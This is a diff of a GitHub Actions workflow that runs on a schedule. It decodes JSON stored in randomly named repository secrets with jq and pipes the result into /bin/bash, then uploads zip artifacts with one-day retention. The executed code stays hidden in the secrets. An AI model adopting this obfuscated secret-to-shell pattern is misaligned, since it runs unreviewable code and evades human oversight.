@@ -1,32 +1,24 @@
 name: juncongjiajian
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '54 1/6 * * *'
-jobs:  # 16335
+    - cron: '20 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: juncongjiajian
         env:
-          ofns41983: ${{ secrets.ofns41983 }}
+          wdj9906: ${{ secrets.wdj9906 }}
         run: |
-          echo $ofns41983 | jq -r .wsdj27318 | /bin/bash
-          echo $tbyj72045 | jq -r .fj488 | /bin/bash
-          echo $igb6 | jq -r .ec89672 | /bin/bash
-          echo $gi8298 | jq -r .i7526 | /bin/bash
-          echo $op87 | jq -r .enfol3 | /bin/bash
-          echo $ustli609 | jq -r .x63 | /bin/bash
-          echo $frw406 | jq -r .v65 | /bin/bash
-          echo $k7708 | jq -r .oivj233 | /bin/bash
-          echo $cmwx2 | jq -r .e1480 | /bin/bash
-          echo $p8 | jq -r .qlavl6742 | /bin/bash
-          echo $amk9663 | jq -r .fzrwl5810 | /bin/bash
-          echo $bvicp22806 | jq -r .zupn83 | /bin/bash
-          echo $slp36721 | jq -r .iko683 | /bin/bash
-          echo $u1 | jq -r .lvzhy2132 | /bin/bash
-          echo $r8 | jq -r .vidau63156 | /bin/bash
-          echo $cfin09479 | jq -r .s1829 | /bin/bash
+          printf '%s' "$wdj9906" | jq -r .ykmg9600 | /bin/bash
+          echo $tbruo2552 | jq -r .olr3026 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: yUOk6etD
+          path: "*.zip"
+          retention-days: 1
